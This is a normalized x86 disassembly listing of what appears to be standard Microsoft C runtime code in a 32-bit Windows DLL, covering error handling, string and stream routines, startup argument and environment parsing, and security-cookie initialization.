movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10017d42
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10018481
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10015ab2
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10018220
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_100174a4
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_100174a4
pop ecx
sub_10015bdb
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_10015ab2
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_10015c00
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10015bdb
int3
pop ebp
jmp eax
sub_10015c3d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10015ca5
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10015c92
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10015c3d
pop ecx
mov esi eax
call sub_10015c7f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10015ce6
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10015d9e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10019ab4
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10015c7f
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_10015c7f
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100198ff
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1001978c
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_100198a9
pop ecx
test eax eax
jne r-xdata
call sub_100198ff
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1001978c
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10019860
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10018fa5
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10015f02
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_10015d9e
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10015f35
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_10015c7f
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_10015c7f
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_10015f02
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_10015c7f
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_10015c7f
cmp [ eax ] 0x2a
jne r-xdata
call sub_10015c7f
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_10015f02
sub_10015fa9
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_10013009
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_10019ab4
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x260 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x260 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_10016b60
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10016bf3
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1001450b
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1001450b
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_10016e38
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_100134fd
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_10016e8b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10015155
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1001450b
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10013a00
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10013a00
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_100134fd
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1001450b
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_100134fd
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1001399a
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10015bdb
int3
add edi 0x4
sub_10016f67
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_10019cb5
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_10019cb5
pop ecx
test eax eax
je r-xdata
call sub_10019cb5
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_10017101
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_10015155
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10016f67
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_100144c6
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10016f67
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100171bc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_100144c6
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_100134fd
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_10017253
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10017279
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1001729f
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100155e3
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_100173e9
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1001729f
pop ecx
pop ecx
pop ebp
retn
sub_10017409
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
